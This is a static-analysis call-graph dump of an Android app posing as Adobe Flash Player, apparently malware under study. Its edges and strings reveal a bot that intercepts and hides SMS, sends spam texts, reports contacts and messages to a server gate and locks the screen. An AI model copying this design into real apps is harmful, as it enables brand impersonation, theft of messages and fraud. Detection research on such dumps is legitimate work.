SPECIAL edge: specialinvoke r0.<android.webkit.WebViewClient: void <init>()>() in <com.adobe.flashplayer_.Prefs$navW: void <init>(com.adobe.flashplayer_.Prefs)> ==> <android.webkit.WebViewClient: void <init>()>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r18) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: $r35 = staticinvoke <android.telephony.SmsManager: android.telephony.SmsManager getDefault()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <android.telephony.SmsManager: android.telephony.SmsManager getDefault()>
VIRTUAL edge: r4 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
SPECIAL edge: specialinvoke $r53.<java.lang.StringBuilder: void <init>(java.lang.String)>("&b=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r23) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r55.<java.lang.StringBuffer: void <init>()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuffer: void <init>()>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r16) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $i0 = virtualinvoke r19.<java.lang.String: int indexOf(java.lang.String)>("getProcesses") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: int indexOf(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&c=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke $r56.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(".txt") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&d=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r20 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("]:Executed:HTTP") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: virtualinvoke r4.<java.io.OutputStreamWriter: void write(java.lang.String)>($r1) in <com.adobe.flashplayer_.FlashZ: void saveData(java.lang.String,java.lang.String,android.content.Context)> ==> <java.io.Writer: void write(java.lang.String)>
VIRTUAL edge: $r24 = virtualinvoke r8.<java.lang.String: java.lang.String[] split(java.lang.String)>(" ") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String[] split(java.lang.String)>
VIRTUAL edge: $r14 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r7) in <com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r60.<java.util.Date: void <init>(long)>($l4) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.util.Date: void <init>(long)>
VIRTUAL edge: $i0 = virtualinvoke r19.<java.lang.String: int indexOf(java.lang.String)>("getMessages") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: int indexOf(java.lang.String)>
STATIC edge: $r2 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>($r2) in <com.adobe.flashplayer_.MacrosStat: void onCreate()> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r20) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r1.<android.view.View: void <init>(android.content.Context)>(null) in <dummyMainClass: com.adobe.flashplayer_.FlashW dummyMainMethod_com_adobe_flashplayer___FlashW(android.content.Intent)> ==> <android.view.View: void <init>(android.content.Context)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&c=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r4) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r56.<java.lang.StringBuilder: void <init>(java.lang.String)>(r4) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke r3.<java.io.InputStreamReader: void <init>(java.io.InputStream)>($r5) in <com.adobe.flashplayer_.AdobeFlashCore: java.lang.String readConfig(java.lang.String)> ==> <java.io.InputStreamReader: void <init>(java.io.InputStream)>
SPECIAL edge: specialinvoke $r56.<java.lang.StringBuilder: void <init>(java.lang.String)>(r4) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: $r20 = virtualinvoke $r15.<java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>(":", "") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>
SPECIAL edge: specialinvoke $r54.<com.adobe.flashplayer_.FlashVirtual: void <init>()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.FlashVirtual: void <init>()>
VIRTUAL edge: $r1 = virtualinvoke r0.<com.adobe.flashplayer_.MacrosStat: android.content.Intent getIntent()>() in <com.adobe.flashplayer_.MacrosStat: android.os.IBinder onBind(android.content.Intent)> ==> <com.adobe.flashplayer_.MacrosStat: android.content.Intent getIntent()>
VIRTUAL edge: virtualinvoke r0.<com.adobe.flashplayer_.FlashARM: android.content.ComponentName startService(android.content.Intent)>(r2) in <com.adobe.flashplayer_.FlashARM: void onCreate(android.os.Bundle)> ==> <android.content.ContextWrapper: android.content.ComponentName startService(android.content.Intent)>
VIRTUAL edge: virtualinvoke r4.<java.lang.StringBuffer: java.lang.StringBuffer append(java.lang.String)>($r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuffer: java.lang.StringBuffer append(java.lang.String)>
SPECIAL edge: $r9 = specialinvoke r0.<com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>("Reich_ServerGate", $r1) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>
VIRTUAL edge: $r20 = virtualinvoke $r20.<java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>("_", " ") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>
VIRTUAL edge: virtualinvoke r2.<android.content.Intent: android.content.Intent setFlags(int)>(1048576) in <com.adobe.flashplayer.Certificate$1: void onClick(android.view.View)> ==> <android.content.Intent: android.content.Intent setFlags(int)>
VIRTUAL edge: $r20 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.String toString()>
SPECIAL edge: specialinvoke $r58.<com.adobe.flashplayer_.FlashVirtual: void <init>()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashVirtual: void <init>()>
VIRTUAL edge: $i0 = virtualinvoke $r20.<java.lang.String: int length()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: int length()>
VIRTUAL edge: $r14 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r2) in <com.adobe.flashplayer_.FlashURL: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r5.<java.lang.StringBuilder: void <init>()>() in <com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: void <init>()>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.FlashURL: void saveData(java.lang.String,java.lang.String,android.content.Context)>($r21, r4, $r1) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: void saveData(java.lang.String,java.lang.String,android.content.Context)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&h=in_sms&i=cmd") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: r25 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>(r25) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
SPECIAL edge: specialinvoke $r53.<java.lang.StringBuilder: void <init>(java.lang.String)>($r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: r8 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r18) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.FlashURL: void saveData(java.lang.String,java.lang.String,android.content.Context)>(r25, "in.txt", $r1) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: void saveData(java.lang.String,java.lang.String,android.content.Context)>
VIRTUAL edge: $r16 = virtualinvoke $r22.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(".txt") in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&f=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: r4 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>(r4) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
SPECIAL edge: specialinvoke $r2.<com.adobe.flashplayer.Certificate$1: void <init>(com.adobe.flashplayer.Certificate)>($r0) in <dummyMainClass: com.adobe.flashplayer.Certificate dummyMainMethod_com_adobe_flashplayer_Certificate(android.content.Intent)> ==> <com.adobe.flashplayer.Certificate$1: void <init>(com.adobe.flashplayer.Certificate)>
VIRTUAL edge: $r1 = virtualinvoke r0.<com.adobe.flashplayer_.AdobeUtil: android.content.Intent getIntent()>() in <com.adobe.flashplayer_.AdobeUtil: android.os.IBinder onBind(android.content.Intent)> ==> <com.adobe.flashplayer_.AdobeUtil: android.content.Intent getIntent()>
STATIC edge: staticinvoke <dummyMainClass: com.adobe.flashplayer.Certificate dummyMainMethod_com_adobe_flashplayer_Certificate(android.content.Intent)>(null) in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <dummyMainClass: com.adobe.flashplayer.Certificate dummyMainMethod_com_adobe_flashplayer_Certificate(android.content.Intent)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r16) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r1 = virtualinvoke r3.<java.io.BufferedReader: java.lang.String readLine()>() in <com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)> ==> <java.io.BufferedReader: java.lang.String readLine()>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&g=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
CLINIT edge: staticinvoke <java.lang.Boolean: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <java.lang.Boolean: void <clinit>()>
SPECIAL edge: specialinvoke r3.<java.io.BufferedReader: void <init>(java.io.Reader)>(r4) in <com.adobe.flashplayer_.Prefs: java.lang.String readConfig(java.lang.String,android.content.Context)> ==> <java.io.BufferedReader: void <init>(java.io.Reader)>
VIRTUAL edge: virtualinvoke r4.<java.io.OutputStreamWriter: void close()>() in <com.adobe.flashplayer_.FlashW: void writeConfig(java.lang.String,java.lang.String,android.content.Context)> ==> <java.io.OutputStreamWriter: void close()>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r24) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: $r20 = specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String)>("BotPhone") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r1) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r56.<java.lang.StringBuilder: void <init>(java.lang.String)>(r4) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: $r24 = virtualinvoke r8.<java.lang.String: java.lang.String[] split(java.lang.String)>(" ") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String[] split(java.lang.String)>
VIRTUAL edge: virtualinvoke $r2.<android.content.Intent: android.content.Intent setAction(java.lang.String)>("android.intent.action.VIEW") in <com.adobe.flashplayer_.ADOBEcoreZa: java.lang.CharSequence onDisableRequested(android.content.Context,android.content.Intent)> ==> <android.content.Intent: android.content.Intent setAction(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&c=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r53.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $i0 = virtualinvoke r8.<java.lang.String: int indexOf(java.lang.String)>("setFilter") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: int indexOf(java.lang.String)>
VIRTUAL edge: $r14 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r11) in <com.adobe.flashplayer_.FlashW: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r56.<java.lang.StringBuilder: void <init>(java.lang.String)>("&b=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: virtualinvoke $r0.<com.adobe.flashplayer_.AdobeFlashCore: void onCreate()>() in <dummyMainClass: com.adobe.flashplayer_.AdobeFlashCore dummyMainMethod_com_adobe_flashplayer___AdobeFlashCore(android.content.Intent)> ==> <com.adobe.flashplayer_.AdobeFlashCore: void onCreate()>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r6) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: r1 = specialinvoke r0.<com.adobe.flashplayer_.AdobeFlashCore: java.lang.String readConfig(java.lang.String)>("Reich_SMSGate") in <com.adobe.flashplayer_.AdobeFlashCore: void onCreate()> ==> <com.adobe.flashplayer_.AdobeFlashCore: java.lang.String readConfig(java.lang.String)>
CLINIT edge: staticinvoke <android.content.Intent: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <android.content.Intent: void <clinit>()>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.AdobeFlashCore: void writeConfig(java.lang.String,java.lang.String)>("BotNetwork", r8) in <com.adobe.flashplayer_.AdobeFlashCore: void onCreate()> ==> <com.adobe.flashplayer_.AdobeFlashCore: void writeConfig(java.lang.String,java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke $r56.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r6) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r22) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r55.<java.lang.StringBuffer: void <init>()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuffer: void <init>()>
VIRTUAL edge: r4 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: $i0 = virtualinvoke $r24.<java.lang.String: int indexOf(java.lang.String)>("stop") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: int indexOf(java.lang.String)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)>($r17, $r14, "faceLock[OK]:Executed", $r7) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)>
VIRTUAL edge: $r3 = virtualinvoke r0.<com.adobe.flashplayer_.AdobeFlashCore: java.lang.Object getSystemService(java.lang.String)>("phone") in <com.adobe.flashplayer_.AdobeFlashCore: void onCreate()> ==> <android.content.ContextWrapper: java.lang.Object getSystemService(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&h=contacts&i=cmd") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: r4 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>(r4) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
VIRTUAL edge: virtualinvoke $r54.<com.adobe.flashplayer_.FlashVirtual: android.os.AsyncTask execute(java.lang.Object[])>($r22) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <android.os.AsyncTask: android.os.AsyncTask execute(java.lang.Object[])>
VIRTUAL edge: $i0 = virtualinvoke $r5.<java.lang.String: int indexOf(java.lang.String)>("*") in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: int indexOf(java.lang.String)>
VIRTUAL edge: $r19 = virtualinvoke $r5.<java.lang.String: java.lang.String[] split(java.lang.String)>(",") in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String[] split(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("]") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r22 = virtualinvoke r19.<java.lang.String: java.lang.String[] split(java.lang.String)>(" ") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: java.lang.String[] split(java.lang.String)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.FlashZ: void saveData(java.lang.String,java.lang.String,android.content.Context)>($r11, $r18, $r1) in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashZ: void saveData(java.lang.String,java.lang.String,android.content.Context)>
VIRTUAL edge: $r24 = virtualinvoke r8.<java.lang.String: java.lang.String[] split(java.lang.String)>(" ") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String[] split(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r53.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(" [ Sent Messages ] \r") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <com.adobe.flashplayer.Certificate$1: void <init>(com.adobe.flashplayer.Certificate)> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("]:Executed") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $i0 = virtualinvoke r8.<java.lang.String: int indexOf(java.lang.String)>("keyHttpGate") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: int indexOf(java.lang.String)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)>($r17, $r14, "loadSpam[OK]:Executed:HTTP", $r7) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)>
VIRTUAL edge: r5 = virtualinvoke $r56.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(".txt") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r3 = virtualinvoke r0.<com.adobe.flashplayer_.AdobeFlashCore: java.lang.Object getSystemService(java.lang.String)>("phone") in <com.adobe.flashplayer_.AdobeFlashCore: void onCreate()> ==> <android.content.ContextWrapper: java.lang.Object getSystemService(java.lang.String)>
SPECIAL edge: specialinvoke r3.<java.io.OutputStreamWriter: void <init>(java.io.OutputStream)>($r4) in <com.adobe.flashplayer_.AdobeFlashCore: void writeConfig(java.lang.String,java.lang.String)> ==> <java.io.OutputStreamWriter: void <init>(java.io.OutputStream)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r56.<java.lang.StringBuilder: void <init>(java.lang.String)>("+") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke r0.<android.app.Activity: void onAttachedToWindow()>() in <com.adobe.packages.ZLocker: void onCreate(android.os.Bundle)> ==> <android.app.Activity: void onAttachedToWindow()>
VIRTUAL edge: r4 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("\r") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r18) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: $r36 = staticinvoke <java.lang.Class: java.lang.Class forName(java.lang.String)>($r21) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.Class: java.lang.Class forName(java.lang.String)>
VIRTUAL edge: virtualinvoke r0.<com.adobe.flashplayer_.FlashURL: void abortBroadcast()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <android.content.BroadcastReceiver: void abortBroadcast()>
VIRTUAL edge: $r11 = virtualinvoke r0.<com.adobe.flashplayer_.FlashZ: java.lang.String getResultData()>() in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <android.content.BroadcastReceiver: java.lang.String getResultData()>
VIRTUAL edge: $i0 = virtualinvoke r8.<java.lang.String: int indexOf(java.lang.String)>("sentSpam") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: int indexOf(java.lang.String)>
VIRTUAL edge: $i0 = virtualinvoke r8.<java.lang.String: int indexOf(java.lang.String)>("sendSMS") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: int indexOf(java.lang.String)>
SPECIAL edge: specialinvoke $r1.<android.view.View: void <init>(android.content.Context)>(null) in <dummyMainClass: com.adobe.flashplayer_.MacrosStat dummyMainMethod_com_adobe_flashplayer___MacrosStat(android.content.Intent)> ==> <android.view.View: void <init>(android.content.Context)>
SPECIAL edge: specialinvoke $r1.<android.view.View: void <init>(android.content.Context)>(null) in <dummyMainClass: com.adobe.packages.BK dummyMainMethod_com_adobe_packages_BK(android.content.Intent)> ==> <android.view.View: void <init>(android.content.Context)>
VIRTUAL edge: virtualinvoke $r54.<com.adobe.flashplayer_.FlashVirtual: android.os.AsyncTask execute(java.lang.Object[])>($r29) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <android.os.AsyncTask: android.os.AsyncTask execute(java.lang.Object[])>
SPECIAL edge: specialinvoke $r56.<java.lang.StringBuilder: void <init>(java.lang.String)>("&b=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
